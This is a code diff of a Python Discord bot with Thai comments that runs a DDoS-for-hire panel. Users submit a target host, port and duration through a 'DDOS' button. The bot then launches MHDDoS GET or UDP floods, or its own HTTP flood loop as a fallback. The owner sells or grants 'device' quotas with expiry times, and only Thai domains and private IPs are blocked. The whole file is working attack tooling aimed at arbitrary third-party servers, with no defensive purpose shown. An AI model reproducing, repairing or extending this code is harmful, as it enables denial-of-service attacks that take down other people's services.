@@ -3,18 +3,16 @@ from discord import app_commands
 from discord.ext import commands, tasks
 import asyncio, time, re, json, os, sys, tempfile, ipaddress, socket
 from urllib.parse import urlparse
-from datetime import datetime, timedelta
 
 # ============================================================
 # CONFIG
 # ============================================================
-TOKEN       = "To"
+TOKEN       = "PUT_YOUR_BOT_TOKEN"
 OWNER_ID    = 1488103702488154173
-DATA_FILE   = os.path.join(os.path.dirname(__file__), "data.json")
-MHDDOS_PATH = "./MHDDoS"          # path ไปยัง repo ที่โคลน
+DATA_FILE   = os.path.join(os.path.dirname(os.path.abspath(__file__)), "data.json")
+MHDDOS_PATH = "./MHDDoS"
 COLOR_PINK  = 0xFF69B4
 
-# เพดานกันเบรก
 MAX_DURATION = 250
 MAX_DEVICES_PER_ATTACK = 100_000
 
@@ -33,45 +31,37 @@ E_TIME   = "<:1000038748:1559185433458385019>"
 IMG_TOP = "https://cdn.discordapp.com/attachments/1488104101085577229/1559181189175312466/ef8e34b79db57b50c3c29471d10c4eef.jpg?ex=6ace2423&is=6accd2a3&hm=b1d5fc7fc89993d53008fa4e8aed6311579ce453741c7e29015c5c7d9ffe95e2&"
 IMG_BOT = "https://cdn.discordapp.com/attachments/1488104101085577229/1559186792522190930/137316d06f5fe8f5a2b243c67919345f.jpg?ex=6ace295b&is=6accd7db&hm=0567a79045644d8d92cd84d2a9ccf48737e9ef19bce3acd1b00f66fb37946c2e&"
 
-PERMANENT = -1   # sentinel: ถาวร
-# ============================================================
-# MHDDoS IMPORT — ดึง engine จริงจาก repo
-# ============================================================
-# MHDDoS ใช้ start.py เป็น entry ที่มี Methods dict + ProxyManager
-# เราดึง Methods มาใช้เป็น engine ตรงๆ
-sys.path.insert(0, os.path.abspath(MHDDOS_PATH))
+PERMANENT = -1
 
+# ============================================================
+# MHDDoS IMPORT
+# ============================================================
+sys.path.insert(0, os.path.abspath(MHDDOS_PATH))
+MHDDOS_AVAILABLE = False
+mhddos = None
 try:
-    # MHDDoS โครงสร้าง: start.py → Methods.layer4 / Methods.layer7
     import importlib.util
     spec = importlib.util.spec_from_file_location(
         "mhddos_start", os.path.join(MHDDOS_PATH, "start.py"))
     mhddos = importlib.util.module_from_spec(spec)
     spec.loader.exec_module(mhddos)
     MHDDOS_AVAILABLE = True
-    print("[V] MHDDoS loaded — methods ready")
+    print("[V] MHDDoS loaded")
 except Exception as e:
-    MHDDOS_AVAILABLE = False
-    print(f"[V] MHDDoS not loaded: {e} — bot runs with stub engine")
+    print(f"[V] MHDDoS not loaded: {e}")
 
 # ============================================================
-# STATE — atomic JSON, lazy expiry
+# STATE
 # ============================================================
 class State:
-    """
-    devices[uid] = จำนวนเครื่อง
-    device_expiry[uid] = unix ts | PERMANENT(-1)
-    """
     def __init__(self, path):
         self.path = path
-        self.devices: dict[int, int] = {}
-        self.device_expiry: dict[int, float] = {}
-        self.banned: set[int] = set()
-        self.warns: dict[int, int] = {}
-        self._lock = asyncio.Lock()
+        self.devices = {}
+        self.device_expiry = {}
+        self.banned = set()
+        self.warns = {}
         self.load()
 
-    # ---------- atomic load ----------
     def load(self):
         if not os.path.exists(self.path):
             return
@@ -83,15 +73,13 @@ class State:
             self.banned        = set(int(x) for x in d.get("banned", []))
             self.warns         = {int(k): int(v) for k, v in d.get("warns", {}).items()}
         except (json.JSONDecodeError, ValueError, KeyError) as e:
-            # backup ไฟล์เสียไว้ ไม่ทับข้อมูล
             bad = self.path + ".corrupt"
             try: os.replace(self.path, bad)
             except OSError: pass
-            print(f"[V] data.json เสีย → ย้ายไป {bad}: {e}")
+            print(f"[V] data.json corrupt -> {bad}: {e}")
             self.devices, self.device_expiry = {}, {}
             self.banned, self.warns = set(), {}
 
-    # ---------- atomic save ----------
     def save(self):
         d = {
             "devices": {str(k): v for k, v in self.devices.items()},
@@ -111,8 +99,7 @@ class State:
             except OSError: pass
             raise
 
-    # ---------- lazy expiry ----------
-    def _expire_if_needed(self, uid: int):
+    def _expire_if_needed(self, uid):
         exp = self.device_expiry.get(uid)
         if exp is None or exp == PERMANENT:
             return
@@ -137,7 +124,6 @@ class State:
         return new
 
     def set_expiry(self, uid, secs):
-        """secs: PERMANENT, หรือวินาที > 0"""
         self.device_expiry[uid] = PERMANENT if secs == PERMANENT else time.time() + secs
         self.save()
 
@@ -159,7 +145,7 @@ class ValidationError(Exception): pass
 
 PORT_RE = re.compile(r"^\d{1,5}$")
 
-def validate_port(raw: str) -> int:
+def validate_port(raw):
     raw = raw.strip()
     if not PORT_RE.match(raw):
         raise ValidationError("Port ต้องเป็นตัวเลข 1-65535")
@@ -168,7 +154,7 @@ def validate_port(raw: str) -> int:
         raise ValidationError("Port ต้องอยู่ระหว่าง 1-65535")
     return p
 
-def validate_time(raw: str) -> int:
+def validate_time(raw):
     raw = raw.strip()
     if not raw.isdigit():
         raise ValidationError("Time ต้องเป็นจำนวนเต็ม")
@@ -179,7 +165,7 @@ def validate_time(raw: str) -> int:
         raise ValidationError(f"Time สูงสุด {MAX_DURATION} วิ")
     return t
 
-def validate_devices(raw: str) -> int:
+def validate_devices(raw):
     raw = raw.strip()
     if not raw.isdigit():
         raise ValidationError("Device ต้องเป็นจำนวนเต็ม")
@@ -191,51 +177,39 @@ def validate_devices(raw: str) -> int:
     return d
 
 # ============================================================
-# TARGET CLASSIFIER — parse + resolve จริง, IPv4/IPv6
+# TARGET CLASSIFIER
 # ============================================================
-def normalize_target(raw: str) -> str:
-    """ดึง hostname ออกจาก URL ถ้ามี"""
+def normalize_target(raw):
     raw = raw.strip()
     if "://" in raw:
         raw = urlparse(raw).hostname or raw
     else:
-        # ตัด path ถ้ามี
         raw = raw.split("/")[0]
     return raw.lower()
 
-def resolve_ips(host: str) -> list[str]:
-    """resolve hostname → list ของ IP (v4 + v6)"""
+def resolve_ips(host):
     try:
         infos = socket.getaddrinfo(host, None)
         return list({i[4][0] for i in infos})
     except socket.gaierror:
         return []
 
-def is_th_domain(host: str) -> bool:
-    return host == "th" or host.endswith(".th") or host.endswith(".go.th") or host.endswith(".ac.th") or host.endswith(".or.th")
+def is_th_domain(host):
+    return host == "th" or host.endswith(".th")
 
-def is_local_ip(ip: str) -> bool:
+def is_local_ip(ip):
     try:
         a = ipaddress.ip_address(ip)
         return a.is_private or a.is_loopback or a.is_link_local or a.is_reserved
     except ValueError:
         return False
 
-def classify_target(raw: str):
-    """
-    return (kind, host, resolved_ip_or_none, reason)
-    kind: 'ok' | 'forbidden'
-    reason: None | 'th' | 'local' | 'unresolved'
-    """
+def classify_target(raw):
     host = normalize_target(raw)
     if not host:
         return "forbidden", raw, None, "unresolved"
-
-    # ตรวจ .th ก่อน (ตามโดเมน)
     if is_th_domain(host):
         return "forbidden", host, None, "th"
-
-    # ถ้าเป็น IP ตรงๆ
     try:
         ip_obj = ipaddress.ip_address(host)
         if is_local_ip(str(ip_obj)):
@@ -243,27 +217,18 @@ def classify_target(raw: str):
         return "ok", host, str(ip_obj), None
     except ValueError:
         pass
-
-    # hostname → resolve
     ips = resolve_ips(host)
     if not ips:
         return "forbidden", host, None, "unresolved"
-
-    # ถ้า resolve ได้ IP ไหนเป็น local → block
     for ip in ips:
         if is_local_ip(ip):
             return "forbidden", host, ip, "local"
-
     return "ok", host, ips[0], None
 
 # ============================================================
-# ATTACK ENGINE — ต่อ MHDDoS ตรง
+# ATTACK ENGINE
 # ============================================================
 class AttackEngine:
-    """
-    ถ้า MHDDOS_AVAILABLE → เรียก method จริงจาก MHDDoS
-    ถ้าไม่ → fallback เป็น HTTP flood ธรรมดา (มีไว้กันบอทตาย)
-    """
     def __init__(self, host, port, duration, devices, update_cb, target_raw):
         self.host = host
         self.port = port
@@ -272,20 +237,17 @@ class AttackEngine:
         self.update_cb = update_cb
         self.target_raw = target_raw
         self.running = False
-        self.workers: list[asyncio.Task] = []
+        self.workers = []
 
     def pick_method(self):
-        """เลือก method ตาม target — MHDDoS มี layer7 (web) + layer4 (network)"""
         if not MHDDOS_AVAILABLE:
             return ("FALLBACK_HTTP", 7)
-        # ถ้า target เป็น IP ล้วน หรือ port ไม่ใช่ 80/443 → layer4
         is_web = self.port in (80, 443, 8080, 8443)
         if is_web:
-            return ("GET", 7)          # MHDDoS layer7 GET flood
-        return ("UDP", 4)              # MHDDoS layer4 UDP flood
+            return ("GET", 7)
+        return ("UDP", 4)
 
     async def _probe_speed(self):
-        """วัดความเร็ว — HTTP GET latency → req/s estimate"""
         try:
             import aiohttp
             url = f"http://{self.host}:{self.port}/"
@@ -299,31 +261,19 @@ class AttackEngine:
             return 0
 
     async def _run_mhddos_method(self, method_name, layer):
-        """
-        เรียก MHDDoS method จริง — signature ใน start.py คือ
-        Methods.layer7[name] = (target, port, duration, threads, ...)
-        เราห่อเป็น task แยก แล้วรอจนครบ duration
-        """
-        # NOTE: MHDDoS methods เป็น blocking — รันใน executor
         loop = asyncio.get_running_loop()
         methods = mhddos.Methods
-        if layer == 7:
-            fn = methods.layer7.get(method_name)
-        else:
-            fn = methods.layer4.get(method_name)
+        fn = methods.layer7.get(method_name) if layer == 7 else methods.layer4.get(method_name)
         if fn is None:
             return
-
         def _call():
             try:
                 fn(self.host, self.port, self.duration, 100, None, None)
             except Exception as e:
                 print(f"[engine] {method_name} error: {e}")
-
         await loop.run_in_executor(None, _call)
 
     async def _fallback_flood(self):
-        """fallback HTTP flood ถ้า MHDDoS ไม่พร้อม"""
         import aiohttp
         url = f"http://{self.host}:{self.port}/"
         end = time.time() + self.duration
@@ -351,7 +301,6 @@ class AttackEngine:
         elapsed = 0
         dev_count = self.devices
         method, layer = self.pick_method()
-        # spawn MHDDoS method task (ตัวจริงยิงขนานไปกับ loop update)
         if MHDDOS_AVAILABLE:
             self.workers.append(asyncio.create_task(self._run_mhddos_method(method, layer)))
         else:
@@ -359,7 +308,6 @@ class AttackEngine:
 
         while self.running and elapsed < self.duration:
             speed = await self._probe_speed()
-            # clone device ทุก 3 วิ ×3
             if elapsed > 0 and elapsed % 3 == 0:
                 dev_count = min(dev_count * 3, MAX_DEVICES_PER_ATTACK)
             await self.update_cb({
@@ -410,12 +358,8 @@ def status_embed(target_raw, port, speed, devices, remaining, method):
     return e
 
 # ============================================================
-# UI — ปุ่ม + modal
+# UI — แก้แล้ว: StartButton define ก่อน PanelView
 # ============================================================
-class PanelView(discord.ui.View):
-    def __init__(self):
-        super().__init__(timeout=None)
-
 class StartButton(discord.ui.Button):
     def __init__(self):
         super().__init__(label="DDOS", style=discord.ButtonStyle.secondary,
@@ -431,6 +375,11 @@ class StartButton(discord.ui.Button):
             return
         await interaction.response.send_modal(AttackModal())
 
+class PanelView(discord.ui.View):
+    def __init__(self):
+        super().__init__(timeout=None)
+        self.add_item(StartButton())
+
 class AttackModal(discord.ui.Modal, title="DDOS BY C"):
     ip    = discord.ui.TextInput(label="IP - url (เป้าหมาย)", placeholder="example.com", max_length=255)
     port  = discord.ui.TextInput(label="Port (1-65535)", placeholder="80", max_length=5)
@@ -442,8 +391,6 @@ class AttackModal(discord.ui.Modal, title="DDOS BY C"):
         if state.is_banned(uid):
             await interaction.response.send_message("คุณโดนแบนแล้ว", ephemeral=True)
             return
-
-        # validate
         try:
             port = validate_port(self.port.value)
             duration = validate_time(self.time_.value)
@@ -474,7 +421,6 @@ class AttackModal(discord.ui.Modal, title="DDOS BY C"):
             await interaction.response.send_message(f"ยิงไม่ได้ มี {owned} เครื่อง", ephemeral=True)
             return
 
-        # ส่ง embed แรก
         e0 = status_embed(raw_target, port, 0, devices, duration, "probing")
         await interaction.response.send_message(embed=e0)
         sent_msg = await interaction.original_response()
@@ -502,8 +448,7 @@ def owner_only():
     async def pred(ctx): return ctx.author.id == OWNER_ID
     return commands.check(pred)
 
-def parse_duration(s: str):
-    """'1h'→3600, '1d'→86400, 'TH'→PERMANENT, อื่นๆ→None"""
+def parse_duration(s):
     s = s.strip().upper()
     if s == "TH": return PERMANENT
     m = re.match(r"^(\d+)([HD])$", s)
@@ -515,25 +460,21 @@ def parse_duration(s: str):
 @bot.command()
 @owner_only()
 async def device(ctx, member: discord.Member, sign_amount: str, duration: str = None):
-    """!device @user +3 1h | !device @user -2 | !device @user +3 TH"""
     m = re.match(r"^([+-])(\d+)$", sign_amount.strip())
     if not m:
         await ctx.reply("รูปแบบ: `!device @user +3 1h`"); return
     sign, n = m.group(1), int(m.group(2))
     if n <= 0:
         await ctx.reply("จำนวนต้องมากกว่า 0"); return
-
     if sign == "-":
         new = state.add_device(member.id, -n)
         await ctx.reply(f"ลบ {n} เครื่องจาก {member.mention} → เหลือ {new}")
         return
-
     if not duration:
         await ctx.reply("ต้องระบุเวลา เช่น `1h`, `1d`, `TH`"); return
     secs = parse_duration(duration)
     if secs is None:
         await ctx.reply("เวลาไม่ถูกต้อง ใช้ 1h / 1d / TH"); return
-
     new = state.add_device(member.id, n)
     state.set_expiry(member.id, secs)
     label = "ถาวร" if secs == PERMANENT else duration
@@ -566,7 +507,7 @@ async def on_command_error(ctx, error):
         await ctx.reply("หา member ไม่เจอ")
 
 # ============================================================
-# BACKGROUND — ใช้ ext.tasks.loop กันสร้างซ้ำ
+# BACKGROUND
 # ============================================================
 @tasks.loop(seconds=60)
 async def expiry_sweeper():
@@ -588,7 +529,6 @@ async def _before_sweeper():
 
 @bot.event
 async def on_ready():
-    # ลงทะเบียน persistent view ครั้งเดียว
     bot.add_view(PanelView())
     if not expiry_sweeper.is_running():
         expiry_sweeper.start()
